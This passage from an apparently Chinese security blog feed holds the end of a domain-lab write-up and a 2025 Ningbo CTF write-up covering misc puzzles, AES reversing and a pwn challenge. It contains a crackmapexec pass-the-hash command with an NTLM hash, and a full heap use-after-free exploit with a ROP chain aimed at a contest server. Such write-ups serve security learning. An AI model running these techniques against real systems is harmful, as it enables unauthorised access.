bash">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H b3b4f52af6fdf3105ee5c04215755ff4 -d xiaorang -x <span class="hljs-string">&quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-20.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;依旧白嫖&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云境" scheme="https://www.dr0n.top/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
    
    <category term="专业徽章" scheme="https://www.dr0n.top/tags/%E4%B8%93%E4%B8%9A%E5%BE%BD%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>2025宁波市第八届网络安全大赛初赛wp</title>
    <link href="https://www.dr0n.top/posts/1e3f469b/"/>
    <id>https://www.dr0n.top/posts/1e3f469b/</id>
    <published>2025-08-17T06:00:00.000Z</published>
    <updated>2025-08-18T11:25:06.085Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="吾的字节-1"><a href="#吾的字节-1" class="headerlink" title="吾的字节_1"></a>吾的字节_1</h2><p>二维码图片等距提取像素点并将黑白转成10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;five.png&quot;</span>)<br>x_, y_ = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>w, h = a.size<br>b = Image.new(a.mode, (w // <span class="hljs-number">10</span>, h // <span class="hljs-number">10</span>))<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, w, <span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, h, <span class="hljs-number">10</span>):<br>        pixel = a.getpixel((x, y))<br>        b.putpixel((x_, y_), pixel)<br>        y_ += <span class="hljs-number">1</span><br>    x_ += <span class="hljs-number">1</span><br>    y_ = <span class="hljs-number">0</span><br><br>b.save(<span class="hljs-string">&quot;1.png&quot;</span>)<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">image_to_binary_string</span>(<span class="hljs-params">image_path</span>):<br>    img = Image.<span class="hljs-built_in">open</span>(image_path).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    width, height = img.size<br><br>    binary_str = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            r, g, b = img.getpixel((x, y))<br>            <span class="hljs-keyword">if</span> (r, g, b) == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>                binary_str += <span class="hljs-string">&quot;1&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                binary_str += <span class="hljs-string">&quot;0&quot;</span><br>    <span class="hljs-keyword">return</span> binary_str<br><br>binary_str = image_to_binary_string(<span class="hljs-string">&quot;1.png&quot;</span>)<br><span class="hljs-built_in">print</span>(binary_str)<br></code></pre></td></tr></table></figure><p>根据提示5个一组使用博多码解密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">IT WAS A 5-BIT CODE THAT BECAME KNOWN AS THE INTERNATIONAL TELEGRAPH ALPHABET NO 1 (ITA1). SMART YOU HAVE FOUND THIS PLACE AND THE FLAG IS JU5T-A-F1VE6IT-9AME<br></code></pre></td></tr></table></figure><h2 id="Infinite-transformation"><a href="#Infinite-transformation" class="headerlink" title="Infinite_transformation"></a>Infinite_transformation</h2><p>压缩包注释</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">boom!可能是6位吧<br>密码拆开也许会有别的作用<br></code></pre></td></tr></table></figure><p>爆破得到密码<code>121144</code></p><p>用rs打开vmdk文件</p><p><img src="/img/wp/2025/ningbo-1.png"></p><p>ctf.png 的777通道有另一张图片</p><p><img src="/img/wp/2025/ningbo-2.png"></p><p>根据提示<code>也许有一只猫</code>，猜测是爆破参数的猫脸变换</p><p>加上最开始提示的密码，猜测a和b的参数是121和144</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de_arnold</span>(<span class="hljs-params">img, shuffle_time, a, b</span>):<br>    r, c, d = img.shape<br>    dp = np.zeros(img.shape, np.uint8)<br><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(shuffle_time):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>                x = ((a * b + <span class="hljs-number">1</span>) * i - b * j) % r<br>                y = (-a * i + j) % c<br>                dp[x, y, :] = img[i, j, :]<br>        img = np.copy(dp)<br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-comment"># 参数设置</span><br>a, b = <span class="hljs-number">121</span>, <span class="hljs-number">144</span> <span class="hljs-comment"># Arnold变换的参数</span><br>max_attempts = <span class="hljs-number">100</span> <span class="hljs-comment"># 爆破的最大尝试次数</span><br>output_dir = <span class="hljs-string">&quot;decrypted_images&quot;</span>  <span class="hljs-comment"># 输出文件夹</span><br>os.makedirs(output_dir, exist_ok=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 读取加密图片</span><br>img_en = cv2.imread(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br><span class="hljs-keyword">if</span> img_en <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">raise</span> FileNotFoundError(<span class="hljs-string">&quot;加密图片未找到，请检查路径和文件名是否正确。&quot;</span>)<br><br><span class="hljs-comment"># 开始爆破</span><br><span class="hljs-keyword">for</span> shuffle_time <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, max_attempts + <span class="hljs-number">1</span>):<br>    img_decrypted = de_arnold(img_en, shuffle_time, a, b)<br>    output_path = os.path.join(output_dir, <span class="hljs-string">f&quot;flag_<span class="hljs-subst">&#123;shuffle_time&#125;</span>.png&quot;</span>)<br>    cv2.imwrite(output_path, img_decrypted)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密图片已保存: <span class="hljs-subst">&#123;output_path&#125;</span>&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;爆破完成，共生成 <span class="hljs-subst">&#123;max_attempts&#125;</span> 张解密图片，保存在文件夹: <span class="hljs-subst">&#123;output_dir&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2025/ningbo-4.png"></p><p>另一部分flag.txt根据hint.txt中的提示<code>数字映射函数</code>使用Tupper自我指涉公式做出图像</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Tuppers_Self_Referential_Formula</span>():<br>    k = <span class="hljs-number">64302039943980618121484184873128503074609076299244422107146064367058121738007282650851520841656649070683123403821937513267391370346165645908933956953599129037238861474390287394253991334205788122863003605507035424785292830536282067025856204240859500900770386319047433635878298987553848841486636769829855797015618861382395619672208366605793866695702843978585628878996390708495917362310741277717465790690657480858197797078816624813513712771929056001109014477328987890335180242509040895793315048815591172058129474723554263040</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x, y</span>):<br>        d = ((-<span class="hljs-number">17</span> * x) - (y % <span class="hljs-number">17</span>))<br>        e = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, [<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-d)]) <span class="hljs-keyword">if</span> d <span class="hljs-keyword">else</span> <span class="hljs-number">1</span><br>        g = ((y // <span class="hljs-number">17</span>) // e) % <span class="hljs-number">2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> &lt; g<br><br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k + <span class="hljs-number">16</span>, k - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        line = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">107</span>):<br>            <span class="hljs-keyword">if</span> f(x, y):<br>                line += <span class="hljs-string">&quot; ■&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                line += <span class="hljs-string">&quot;  &quot;</span><br>        <span class="hljs-built_in">print</span>(line)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Tuppers_Self_Referential_Formula()<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2025/ningbo-3.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="entity-cache"><a href="#entity-cache" class="headerlink" title="entity_cache"></a>entity_cache</h2><p>存在uaf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> LibcSearcher<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Code: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;id &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;fragment &gt;&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Code: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;id &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;stream &gt;&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Code: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;id &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Code: &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;id &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><br><span class="hljs-comment">#p=process(&#x27;entity_cache&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;139.155.126.78&#x27;</span>,<span class="hljs-string">&#x27;26428&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;[DEBUG INFO]&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./entity_cache&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br>e.address=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)-<span class="hljs-number">0xa1a</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>syscall=e.address+<span class="hljs-number">0xbcc</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>heap0=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap0))<br>heap3=heap0+<span class="hljs-number">0x100</span>*<span class="hljs-number">3</span><br>heap2=heap0+<span class="hljs-number">0x100</span>*<span class="hljs-number">2</span><br><br>edit(<span class="hljs-number">1</span>,p64(e.address+<span class="hljs-number">0x202060</span>))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf0</span>) <span class="hljs-comment"># cache</span><br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>show(<span class="hljs-number">0</span>)<br>puts=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc.address=puts-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>env=libc.symbols[<span class="hljs-string">&#x27;environ&#x27;</span>]<br><br>edit(<span class="hljs-number">5</span>,p64(env))<br>show(<span class="hljs-number">0</span>)<br>stack=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)[:<span class="hljs-number">8</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>edit(<span class="hljs-number">5</span>,p64(stack-<span class="hljs-number">0x120</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>))<br>show(<span class="hljs-number">0</span>)<br>stack1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)[:<span class="hljs-number">8</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack1))<br><br><br>main_stack=stack-<span class="hljs-number">0x120</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">5</span>,p64(main_stack))<br><span class="hljs-comment">#gdb.attach(p)</span><br>pause()<br><br>rdi=<span class="hljs-number">0x000000000002164f</span>+libc.address<br>rsi=<span class="hljs-number">0x0000000000023a6a</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000001b96</span>+libc.address<br>rax=<span class="hljs-number">0x000000000001b500</span>+libc.address<br>payload=<span class="hljs-string">b&quot;&quot;</span><br>payload=p64(rax)+p64(<span class="hljs-number">2</span>)+p64(rdi)+p64(heap3)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(heap2)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(syscall)<br>payload+=p64(rax)+p64(<span class="hljs-number">1</span>)+p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(heap2)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(syscall)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">0</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="SEA-1"><a href="#SEA-1" class="headerlink" title="SEA_1"></a>SEA_1</h2><p>伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> i; <span class="hljs-comment">// [esp+190h] [ebp-268h]</span><br>  <span class="hljs-type">int</span> v5[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [esp+19Ch] [ebp-25Ch] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [esp+2BCh] [ebp-13Ch] BYREF</span><br>  <span class="hljs-type">char</span> Buf1[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [esp+2E8h] [ebp-110h] BYREF</span><br>  <span class="hljs-type">char</span> Str[<span class="hljs-number">132</span>]; <span class="hljs-comment">// [esp+370h] [ebp-88h] BYREF</span><br><br>  __CheckForDebuggerJustMyCode(&amp;unk_45A019);<br>  <span class="hljs-built_in">memset</span>(Str, <span class="hljs-number">0</span>, <span class="hljs-number">0x80u</span>);<br>  <span class="hljs-built_in">memset</span>(Buf1, <span class="hljs-number">0</span>, <span class="hljs-number">0x80u</span>);<br>  sub_401E00(<span class="hljs-string">&quot;Please input the flag and I will verify it: &quot;</span>);<br>  sub_401E70(<span class="hljs-string">&quot;%128s&quot;</span>, Str);<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;58453eec4d16ae234a10b597dfe1f6a6&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( sub_4016B0(v5, v6, <span class="hljs-number">256</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(Str); i += <span class="hljs-number">16</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( sub_401410((<span class="hljs-type">int</span>)v5, (<span class="hljs-type">int</span>)&amp;Buf1[i], &amp;Str[i]) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(Buf1, &amp;unk_458014, <span class="hljs-number">0x30u</span>) )<br>    sub_401E00(<span class="hljs-string">&quot;Right flag!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    sub_401E00(<span class="hljs-string">&quot;Wrong flag\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>AES加密，密钥是<code>58453eec4d16ae234a10b597dfe1f6a6</code>，密文是<code>unk_458014</code>，dump出来是<code>29708f1980cce40f46abac148d488ca83716fe1d397202797b1999166265623e8f761285cb28e256b381167761e41094</code></p><p>cyberchef解开：<code>DASCTF&#123;75aab2560274ae21aa4554b993e658d1&#125;</code></p><h2 id="flower-world"><a href="#flower-world" class="headerlink" title="flower_world"></a>flower_world</h2><p>1.txt</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span 